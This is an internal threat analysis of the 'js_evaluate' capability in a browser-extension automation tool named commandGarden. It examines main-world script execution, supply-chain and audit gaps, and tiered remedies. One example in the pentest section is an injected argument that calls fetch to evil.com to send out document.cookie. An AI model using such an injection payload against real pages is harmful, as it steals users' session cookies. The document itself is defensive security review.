# `js_evaluate` Security Analysis

Multi-perspective evaluation of the `js_evaluate` pipeline capability in commandGarden,
using `gcs-kb-pages` as the reference connector.

---

## 1. How `js_evaluate` Works

| Aspect | Detail |
|---|---|
| **Execution context** | Page's **MAIN world** — same JS context as the website itself |
| **Mechanism** | `chrome.scripting.executeScript({ world: 'MAIN' })` constructs an `AsyncFunction` from a raw code string (effectively `eval()`) |
| **Code source** | `.eval.js` files co-located with connector `.yaml`, read from disk by the daemon's `ConnectorRegistry.resolveFileRefs()` at startup |
| **Result transport** | Stores result on `globalThis[nonce]`, polled every 200ms by the extension, cleaned up after |
| **Timeout** | 90 seconds (accommodates SSO/MFA flows) |

**Comparison with declarative steps:**

| | `extract` / `click` / `type` | `js_evaluate` |
|---|---|---|
| World | ISOLATED (content script) | MAIN (page context) |
| Access to page JS | No | Full |
| Access to cookies/tokens | No (cross-origin isolated) | Yes (same origin) |
| Code source | Declarative YAML fields | Arbitrary .js file |
| Capability risk | `dom_read` (low) / `dom_write` (medium) | `js_evaluate` (**high**) |

---

## 2. Security Officer Perspective

### What I see

**`js_evaluate` is the only `high`-risk capability alongside `cookie_write`.** It is used by 7 of 8 connectors — it is effectively the default, not the exception. This undermines the capability model: if nearly every connector requires the highest privilege, the permission system provides no meaningful differentiation.

### Specific risks

1. **Unrestricted code execution in a privileged origin.** The `.eval.js` runs as the authenticated user within corporate SSO-protected pages (Mercedes-Benz intranet). It can:
   - Read/write `localStorage`, `sessionStorage`, and all cookies (including `HttpOnly` via `document.cookie` on same origin)
   - Call any API the page can call, with the user's session
   - Modify DOM to phish credentials or redirect flows
   - Exfiltrate data via `fetch()` to external endpoints

2. **Supply chain risk.** Connector files are loaded from two paths:
   - Bundled: `daemon/connectors/` (version-controlled)
   - User: `~/.commandgarden/connectors/` (not version-controlled)
   
   A compromised or malicious `.eval.js` in either location gets full MAIN-world access. There is **no code signing, integrity verification, or hash pinning** on `.eval.js` files. The `connectorHash` in audit events hashes the YAML, not the JS.

3. **No runtime sandbox.** Unlike the ISOLATED-world content script (which can only see DOM, not page JS), MAIN-world code has zero restrictions. There is no CSP enforcement, no API allowlist, no network egress control.

4. **Audit gap.** The audit trail records that `js_evaluate` ran and how long it took, but **does not log what the code did** — no network calls, no DOM mutations, no data accessed beyond the returned rows.

### Existing mitigations

| Mitigation | Effectiveness |
|---|---|
| Capability declared in YAML | Informational only — no enforcement beyond "connector says it needs this" |
| `highRiskCapabilities` config | Can flag `js_evaluate` for review, but defaults to empty `approvedHighRisk` |
| `approvalRequired` config | Can require user approval before `js_evaluate` runs — **but defaults to empty (no approval required)** |
| Audit trail | Records command-level events, not code-level actions |
| Domain allowlist in YAML | Only enforced for `navigate` and `fetch` steps, **not for `js_evaluate`** (the JS can `fetch()` anywhere) |

### Verdict

**The permission model is sound in design but the defaults are permissive.** `js_evaluate` should require explicit approval by default, not opt-in. The domain allowlist should be enforced at the network level for MAIN-world code.

---

## 3. Penetration Tester Perspective

### Attack surface analysis

#### Attack 1: Malicious connector injection
- **Vector:** Drop a `.yaml` + `.eval.js` into `~/.commandgarden/connectors/`
- **Prerequisite:** Write access to the user's home directory (local malware, compromised npm package, etc.)
- **Impact:** Full access to any corporate intranet page the user navigates to. The connector can declare any domain and the eval.js runs in MAIN world with the user's authenticated session.
- **Detection:** The daemon logs `command.start` but the attacker controls the connector name. No file integrity monitoring.

#### Attack 2: Connector YAML tampering
- **Vector:** Modify an existing `.eval.js` file in the bundled connectors directory
- **Prerequisite:** Write access to the daemon installation directory
- **Impact:** Same as above — the modified code runs next time the connector is invoked. The `connectorHash` only covers the YAML content, not the referenced `.eval.js` file.
- **Detection:** `connectorHash` in audit would NOT change (it hashes YAML, not JS). Invisible to audit.

#### Attack 3: Data exfiltration via existing connector
- **Vector:** The `gcs-kb-pages.eval.js` itself could be modified to silently `fetch()` row data to an external server before returning results
- **Impact:** Corporate knowledge base content exfiltrated
- **Detection:** No network egress monitoring in the extension. Audit only sees the returned row count.

#### Attack 4: Privilege escalation via `globalThis` pollution
- **Vector:** The `evaluateInPage` implementation stores results on `globalThis[nonce]`. While the nonce is random, the pattern of storing/polling/deleting is observable by page scripts.
- **Impact:** Low — the nonce is unpredictable and cleaned up. But a page script could enumerate `globalThis` properties matching `__cg_*` to detect the extension's presence.
- **Mitigation:** Use a more isolated communication channel (e.g., `CustomEvent` with a nonce, or `chrome.runtime.sendMessage` from an injected content script).

#### Attack 5: Template injection via `ctx.interpolate`
- **Vector:** If user-supplied args are interpolated into `js_evaluate` code strings without sanitization, an attacker could inject arbitrary JS.
- **Example:** A connector with `code: "let x = '${{ args.query }}'"` — if `args.query` is `'; fetch('https://evil.com/steal?cookie='+document.cookie);//` the injected code runs in MAIN world.
- **Impact:** Full RCE in page context via crafted CLI arguments.
- **Current exposure:** `gcs-kb-pages` uses `file:` (no interpolation in code), but `timetracking-report` likely interpolates `month` into code. Any connector using `${{ args.* }}` inside `js_evaluate` code is vulnerable.

### Severity ranking

| # | Attack | Likelihood | Impact | Risk |
|---|---|---|---|---|
| 5 | Template injection | Medium | Critical | **High** |
| 1 | Malicious connector injection | Medium | Critical | **High** |
| 2 | YAML/JS tampering | Low | Critical | **Medium** |
| 3 | Data exfiltration | Low | High | **Medium** |
| 4 | globalThis detection | Low | Low | **Low** |

---

## 4. DevSecOps Developer Perspective

### Current state assessment

The codebase has a well-designed security architecture:
- Capability model with risk levels
- Approval gates with per-connector overrides
- Audit trail with correlation IDs
- Domain allowlisting for navigation

But **`js_evaluate` bypasses most of these controls** because it operates at a lower level than the declarative pipeline.

### Practical recommendations

#### Tier 1 — Quick wins (no architecture change)

1. **Default `approvalRequired` to include `js_evaluate`.**
   Change `config.ts` default from `[]` to `['js_evaluate']`. Every `js_evaluate` connector would require user approval on first run per session.

2. **Hash `.eval.js` files into `connectorHash`.**
   In `registry.ts`, include the JS file content in the hash, not just the YAML. This makes tampering visible in audit.

3. **Sanitize interpolated args in `js_evaluate` code.**
   In `runner.ts`, either:
   - Refuse to interpolate `${{ args.* }}` inside `js_evaluate` code strings (breaking change), or
   - Pass args as a JSON-serialized object via `AsyncFunction` parameters instead of string interpolation (safe by design)

#### Tier 2 — Medium effort (targeted hardening)

4. **Run `js_evaluate` in ISOLATED world with message passing.**
   Instead of MAIN world, inject the code in ISOLATED world and provide a controlled API surface (`cgBridge.querySelector`, `cgBridge.click`, etc.). The code can read DOM but not access page JS, cookies, or `fetch()`.
   
   Tradeoff: Some connectors (e.g., those needing `sessionStorage` or page-level API calls) would break. But `gcs-kb-pages` only needs DOM access and could work in ISOLATED world.

5. **Add network egress control.**
   Use `chrome.declarativeNetRequest` to block `fetch()`/`XHR` from the tab to domains not in the connector's `domains` list during `js_evaluate` execution.

#### Tier 3 — Strategic (architecture change)

6. **Extend the declarative pipeline vocabulary.**
   Add `click_all` (click every element matching a selector, with retry/recurse) and `extract_tree` (recursive DOM walk with depth/ancestry) steps. These run in ISOLATED world and are auditable by design. This would let `gcs-kb-pages` drop `js_evaluate` entirely.

7. **Connector signing.**
   Sign connector bundles (YAML + all referenced files) with a key. The daemon verifies signatures at load time. Unsigned connectors from `~/.commandgarden/connectors/` require explicit opt-in.

---

## 5. Conclusion

### Is `gcs-kb-pages` implementable without `js_evaluate` today?

**No.** The current pipeline vocabulary lacks recursive click-all and tree-walking extraction. The `extract` step only does flat `querySelectorAll` with `textContent` per field — it cannot compute parent ancestry, section breadcrumbs, or depth.

### Is the security concern valid?

**Yes.** `js_evaluate` is the most powerful and least constrained capability in the system. It runs arbitrary code in the page's MAIN world with full access to the authenticated session. The default configuration provides no approval gate, no network egress control, and incomplete audit coverage.

### What should be done?

**Immediate (Tier 1):** Items 1-3 above are low-effort, backward-compatible, and address the most critical gaps — especially the template injection vulnerability (#5 in pentest findings) and the permissive defaults.

**Next (Tier 2-3):** The long-term direction should be to make `js_evaluate` the exception, not the rule. Extending the declarative pipeline (Tier 3, item 6) lets most connectors — including `gcs-kb-pages` — avoid `js_evaluate` entirely. For connectors that genuinely need page-level JS access, ISOLATED-world execution with a controlled bridge API (Tier 2, item 4) would dramatically reduce the blast radius.

---

*Analysis date: 2025-07-06*
*Connector analyzed: `gcs/kb-pages` (version 1.0)*
*Codebase: commandGarden (monorepo)*
